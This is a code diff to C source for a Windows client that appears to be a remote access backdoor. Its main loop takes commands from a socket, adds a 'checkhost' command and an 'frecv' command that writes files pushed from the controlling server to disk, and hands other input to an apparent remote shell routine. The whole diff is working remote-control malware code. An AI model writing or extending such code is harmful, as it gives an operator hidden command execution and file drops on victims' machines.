@@ -34,7 +34,7 @@ void sockSend(const char* data)
 		int r = send(sockfd, data + totalsent, buflen - totalsent, 0);
 		if (lerror == WSAECONNRESET)
 		{
-			connected = false;
+			connected = FALSE;
 		}
 		if (r < 0) return;
 		totalsent += r;
@@ -53,26 +53,72 @@ void fhdawn_main(void)
             connected = FALSE;
         }
 
-        // if(strcmp(recvbuf, "ls") == 0)
-        // {
-        //     WIN32_FIND_DATA data;
-        //     HANDLE hFind = FindFirstFile("*", &data);
-        //     char list[BUFFER] = {0}; memset(list, '\0', BUFFER);
-        //     if(hFind != INVALID_HANDLE_VALUE){
-        //         do{
-        //             if(data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY){
-        //                 list += data.
-        //             } else {
-        //                 snprintf(list, BUFFER, "[FILE] %s\n", data.cFileName);
-        //             }
-        //         } while(FindNextFile(hFind, &data));
+        if(strcmp(recvbuf, "checkhost") == 0)
+        {
+            memset(recvbuf, '\0', BUFFER);
+            int return_code = recv(sockfd, recvbuf, BUFFER, 0);
+            if (return_code == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
+            {
+                connected = FALSE;
+            }
+            CheckHost(recvbuf);
 
-        //     } else {
-        //         sockprintf(sockfd, "[Error] Failed to get files in Directory, Error : %ld\n", GetLastError());
-        //     }
+        }
+        // TODO: Add File Path check.
+        // TODO: Fix notify bug
+        else if (strcmp(recvbuf, "frecv") == 0) // frecv (file recv) / recv file from server 
+        {
+            memset(recvbuf, '\0', BUFFER);
+            int fsize = 0;
+            int expected = 0;
+            char * fileinfo[2];
+            DWORD dwBytesWritten = 0;
+            BOOL write;
+            // Receive Filename and Filesize.
+            // Format is filename.txt:filesizeinbytes.
+            // Split using ':' delimieter
+            int return_code = recv(sockfd, recvbuf, BUFFER, 0);
+            if (return_code == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
+            {
+                connected = FALSE;
+            }
+            split(recvbuf, fileinfo, ":");
+            expected = atoi(fileinfo[1]);
+            // Create file.
+            HANDLE recvfile = CreateFile(fileinfo[0], FILE_APPEND_DATA, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+            if(recvfile == INVALID_HANDLE_VALUE){
+                sockprintf(sockfd, "[Error Creating File] : %ld", GetLastError());
+            } else {
+                // Start receiving file
+                // once again clear recvbuf
+                memset(recvbuf, '\0', BUFFER);
+                int total = 0;
+                do {
+                    fsize = recv(sockfd, recvbuf, BUFFER, 0 );
+                    if (fsize == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
+                    {
+                        connected = FALSE;
+                        printf("[X] Connection interrupted while receiving file %s for %s size.", fileinfo[0], fileinfo[1]);
+                    }
+                    write = WriteFile(recvfile, recvbuf, fsize, &dwBytesWritten, NULL);
+                    total += fsize;
+                } while(total != expected);
 
-        //     send(sockfd, list, BUFFER, 0);
-        ExecSock();
+                if(write == FALSE)
+                {
+                    sockprintf(sockfd,"[Error Writing file %s of %s size] Error : %ld.", fileinfo[0], fileinfo[1], GetLastError());
+                } else {
+                    sockprintf(sockfd,"[ Received File : %s]\n[ File Size : %s  ]\n[ Bytes written : %ld ]\n", fileinfo[0], fileinfo[1], dwBytesWritten);
+                }
+                CloseHandle(recvfile);
+            }
+            
+
+        } 
+        else {
+            ExecSock();
+        }
+        
     }    
 }
 
